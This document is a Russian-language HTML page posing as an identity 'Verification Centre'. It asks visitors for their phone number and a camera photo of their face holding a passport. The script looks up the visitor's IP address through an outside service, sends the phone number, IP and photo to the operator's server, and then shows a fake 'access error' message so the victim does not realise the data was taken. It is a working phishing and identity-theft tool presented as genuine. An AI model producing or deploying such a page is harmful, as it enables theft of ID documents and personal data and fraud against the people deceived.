<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Центр Верификации</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f9; display: flex; justify-content: center; padding: 20px; }
        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
        .info { font-size: 12px; color: #666; text-align: center; }
    </style>
</head>
<body>
    <div class="card">
        <h3>Подтверждение личности</h3>
        <p class="info">Для продолжения необходимо подтвердить номер телефона и сделать фото лица с паспортом в руках.</p>
        
        <form id="mainForm">
            <input type="text" id="phone" placeholder="+7 (___) ___-__-__" required>
            
            <label>Сделайте фото:</label>
            <input type="file" id="photo" accept="image/*" capture="camera" required>
            
            <button type="submit" id="btn">Подтвердить</button>
        </form>
    </div>

    <script>
        document.getElementById('mainForm').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('btn');
            btn.innerText = 'Обработка...';

            try {
                // 1. Получаем IP
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipRes.json();

                // 2. Собираем данные
                const formData = new FormData();
                formData.append('phone', document.getElementById('phone').value);
                formData.append('ip', ip);
                formData.append('photo', document.getElementById('photo').files[0]);

                // 3. Отправляем на наш будущий сервер
                await fetch('/verify', { method: 'POST', body: formData });

                // 4. Финал
                alert('Ошибка доступа. Попробуйте через 24 часа.');
            } catch (err) {
                alert('Ошибка сети');
            }
            btn.innerText = 'Подтвердить';
        };
    </script>
</body>
</html>